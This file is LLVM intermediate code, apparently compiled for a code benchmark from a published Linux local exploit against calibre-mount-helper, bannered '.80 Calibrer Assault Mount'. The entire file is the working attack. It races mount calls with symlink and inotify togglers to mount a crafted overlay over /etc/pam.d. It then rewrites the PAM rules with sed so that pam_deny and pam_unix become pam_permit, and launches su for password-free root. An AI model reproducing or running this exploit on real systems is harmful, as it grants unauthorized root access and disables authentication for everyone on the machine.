; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_18086.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_18086.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [58 x i8] c"########################################################\0A\00", align 1
@.str.1 = private unnamed_addr constant [58 x i8] c"#               .80 Calibrer Assault Mount             #\0A\00", align 1
@.str.2 = private unnamed_addr constant [58 x i8] c"#                         by zx2c4                     #\0A\00", align 1
@.str.3 = private unnamed_addr constant [59 x i8] c"########################################################\0A\0A\00", align 1
@.str.4 = private unnamed_addr constant [28 x i8] c"[+] Cleaning up old cruft.\0A\00", align 1
@.str.5 = private unnamed_addr constant [17 x i8] c"/dev/shm/overlay\00", align 1
@.str.6 = private unnamed_addr constant [55 x i8] c"calibre-mount-helper cleanup /dev/ram0 /media/staging/\00", align 1
@.str.7 = private unnamed_addr constant [33 x i8] c"[+] Creating overlay container.\0A\00", align 1
@.str.8 = private unnamed_addr constant [48 x i8] c"dd if=/dev/zero of=/dev/shm/overlay count=25600\00", align 1
@.str.9 = private unnamed_addr constant [37 x i8] c"/usr/sbin/mkfs.ntfs /dev/shm/overlay\00", align 1
@.str.10 = private unnamed_addr constant [54 x i8] c"[+] Mounting staging using race condition toggler...\0A\00", align 1
@.str.11 = private unnamed_addr constant [65 x i8] c"calibre-mount-helper mount /dev/shm/overlay /media/staging/ 2>&1\00", align 1
@SIGKILL = common dso_local global i32 0, align 4
@.str.12 = private unnamed_addr constant [24 x i8] c"/dev/shm/overlay-holder\00", align 1
@.str.13 = private unnamed_addr constant [10 x i8] c"/dev/ram0\00", align 1
@.str.14 = private unnamed_addr constant [53 x i8] c"[+] Preparing overlay with /etc/pam.d modification:\0A\00", align 1
@.str.15 = private unnamed_addr constant [35 x i8] c"cp -v /etc/pam.d/* /media/staging/\00", align 1
@.str.16 = private unnamed_addr constant [66 x i8] c"sed -i \22s/pam_deny.so/pam_permit.so/g\22 /media/staging/common-auth\00", align 1
@.str.17 = private unnamed_addr constant [72 x i8] c"sed -i \22s/pam_cracklib.so.*/pam_permit.so/g\22 /media/staging/system-auth\00", align 1
@.str.18 = private unnamed_addr constant [68 x i8] c"sed -i \22s/pam_unix.so.*/pam_permit.so/g\22 /media/staging/system-auth\00", align 1
@.str.19 = private unnamed_addr constant [82 x i8] c"[+] Mounting overlay over /etc/pam.d using race condition toggler and inotify...\0A\00", align 1
@.str.20 = private unnamed_addr constant [61 x i8] c"calibre-mount-helper mount /dev/shm/overlay /etc/pam.d/ 2>&1\00", align 1
@.str.21 = private unnamed_addr constant [20 x i8] c"/media/staging/fake\00", align 1
@IN_CREATE = common dso_local global i32 0, align 4
@.str.22 = private unnamed_addr constant [19 x i8] c"/media/staging/tmp\00", align 1
@.str.23 = private unnamed_addr constant [11 x i8] c"/etc/pam.d\00", align 1
@.str.24 = private unnamed_addr constant [83 x i8] c"[+] Asking for root. When prompted for a password, type anything and press enter.\0A\00", align 1
@.str.25 = private unnamed_addr constant [3 x i8] c"su\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %11 = call i32 @printf(i8* getelementptr inbounds ([58 x i8], [58 x i8]* @.str, i64 0, i64 0))
  %12 = call i32 @printf(i8* getelementptr inbounds ([58 x i8], [58 x i8]* @.str.1, i64 0, i64 0))
  %13 = call i32 @printf(i8* getelementptr inbounds ([58 x i8], [58 x i8]* @.str.2, i64 0, i64 0))
  %14 = call i32 @printf(i8* getelementptr inbounds ([59 x i8], [59 x i8]* @.str.3, i64 0, i64 0))
  %15 = call i32 @printf(i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.4, i64 0, i64 0))
  %16 = call i32 @unlink(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.5, i64 0, i64 0))
  %17 = call i32 @system(i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.6, i64 0, i64 0))
  %18 = call i32 @printf(i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.7, i64 0, i64 0))
  %19 = call i32 @system(i8* getelementptr inbounds ([48 x i8], [48 x i8]* @.str.8, i64 0, i64 0))
  %20 = call i32 @system(i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.9, i64 0, i64 0))
  %21 = call i32 @printf(i8* getelementptr inbounds ([54 x i8], [54 x i8]* @.str.10, i64 0, i64 0))
  %22 = call i32 (...) @fork()
  store i32 %22, i32* %6, align 4
  %23 = load i32, i32* %6, align 4
  %24 = icmp ne i32 %23, 0
  br i1 %24, label %25, label %39

25:                                               ; preds = %2
  br label %26

26:                                               ; preds = %34, %25
  %27 = call i32 @system(i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str.11, i64 0, i64 0))
  store i32 %27, i32* %7, align 4
  %28 = icmp eq i32 %27, 256
  br i1 %28, label %32, label %29

29:                                               ; preds = %26
  %30 = load i32, i32* %7, align 4
  %31 = icmp eq i32 %30, 8192
  br label %32

32:                                               ; preds = %29, %26
  %33 = phi i1 [ true, %26 ], [ %31, %29 ]
  br i1 %33, label %34, label %35

34:                                               ; preds = %32
  br label %26

35:                                               ; preds = %32
  %36 = load i32, i32* %6, align 4
  %37 = load i32, i32* @SIGKILL, align 4
  %38 = call i32 @kill(i32 %36, i32 %37)
  br label %45

39:                                               ; preds = %2
  br label %40

40:                                               ; preds = %39, %40
  %41 = call i32 @rename(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.5, i64 0, i64 0), i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.12, i64 0, i64 0))
  %42 = call i32 @symlink(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.13, i64 0, i64 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.5, i64 0, i64 0))
  %43 = call i32 @unlink(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.5, i64 0, i64 0))
  %44 = call i32 @rename(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.12, i64 0, i64 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.5, i64 0, i64 0))
  br label %40

45:                                               ; preds = %35
  %46 = call i32 @printf(i8* getelementptr inbounds ([53 x i8], [53 x i8]* @.str.14, i64 0, i64 0))
  %47 = call i32 @system(i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.15, i64 0, i64 0))
  %48 = call i32 @system(i8* getelementptr inbounds ([66 x i8], [66 x i8]* @.str.16, i64 0, i64 0))
  %49 = call i32 @system(i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.17, i64 0, i64 0))
  %50 = call i32 @system(i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.18, i64 0, i64 0))
  %51 = call i32 @printf(i8* getelementptr inbounds ([82 x i8], [82 x i8]* @.str.19, i64 0, i64 0))
  %52 = call i32 (...) @fork()
  store i32 %52, i32* %6, align 4
  %53 = load i32, i32* %6, align 4
  %54 = icmp ne i32 %53, 0
  br i1 %54, label %55, label %92

55:                                               ; preds = %45
  %56 = call i32 (...) @fork()
  store i32 %56, i32* %8, align 4
  %57 = load i32, i32* %8, align 4
  %58 = icmp ne i32 %57, 0
  br i1 %58, label %59, label %76

59:                                               ; preds = %55
  br label %60

60:                                               ; preds = %68, %59
  %61 = call i32 @system(i8* getelementptr inbounds ([61 x i8], [61 x i8]* @.str.20, i64 0, i64 0))
  store i32 %61, i32* %9, align 4
  %62 = icmp eq i32 %61, 256
  br i1 %62, label %66, label %63

63:                                               ; preds = %60
  %64 = load i32, i32* %9, align 4
  %65 = icmp eq i32 %64, 8192
  br label %66

66:                                               ; preds = %63, %60
  %67 = phi i1 [ true, %60 ], [ %65, %63 ]
  br i1 %67, label %68, label %69

68:                                               ; preds = %66
  br label %60

69:                                               ; preds = %66
  %70 = load i32, i32* %6, align 4
  %71 = load i32, i32* @SIGKILL, align 4
  %72 = call i32 @kill(i32 %70, i32 %71)
  %73 = load i32, i32* %8, align 4
  %74 = load i32, i32* @SIGKILL, align 4
  %75 = call i32 @kill(i32 %73, i32 %74)
  br label %91

76:                                               ; preds = %55
  br label %77

77:                                               ; preds = %76, %77
  %78 = call i32 (...) @inotify_init()
  store i32 %78, i32* %10, align 4
  %79 = call i32 @unlink(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.21, i64 0, i64 0))
  %80 = call i32 @mkdir(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.21, i64 0, i64 0))
  %81 = load i32, i32* %10, align 4
  %82 = load i32, i32* @IN_CREATE, align 4
  %83 = call i32 @inotify_add_watch(i32 %81, i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.21, i64 0, i64 0), i32 %82)
  %84 = load i32, i32* %10, align 4
  %85 = call i32 @read(i32 %84, i32 0, i32 0)
  %86 = call i32 @rename(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.21, i64 0, i64 0), i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.22, i64 0, i64 0))
  %87 = call i32 @symlink(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.23, i64 0, i64 0), i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.21, i64 0, i64 0))
  %88 = call i32 @rmdir(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.22, i64 0, i64 0))
  %89 = load i32, i32* %10, align 4
  %90 = call i32 @close(i32 %89)
  br label %77

91:                                               ; preds = %69
  br label %98

92:                                               ; preds = %45
  br label %93

93:                                               ; preds = %92, %93
  %94 = call i32 @rename(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.5, i64 0, i64 0), i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.12, i64 0, i64 0))
  %95 = call i32 @symlink(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.13, i64 0, i64 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.5, i64 0, i64 0))
  %96 = call i32 @unlink(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.5, i64 0, i64 0))
  %97 = call i32 @rename(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.12, i64 0, i64 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.5, i64 0, i64 0))
  br label %93

98:                                               ; preds = %91
  %99 = call i32 @printf(i8* getelementptr inbounds ([83 x i8], [83 x i8]* @.str.24, i64 0, i64 0))
  %100 = call i32 @system(i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.25, i64 0, i64 0))
  ret i32 0
}

declare dso_local i32 @printf(i8*) #1

declare dso_local i32 @unlink(i8*) #1

declare dso_local i32 @system(i8*) #1

declare dso_local i32 @fork(...) #1

declare dso_local i32 @kill(i32, i32) #1

declare dso_local i32 @rename(i8*, i8*) #1

declare dso_local i32 @symlink(i8*, i8*) #1

declare dso_local i32 @inotify_init(...) #1

declare dso_local i32 @mkdir(i8*) #1

declare dso_local i32 @inotify_add_watch(i32, i8*, i32) #1

declare dso_local i32 @read(i32, i32, i32) #1

declare dso_local i32 @rmdir(i8*) #1

declare dso_local i32 @close(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
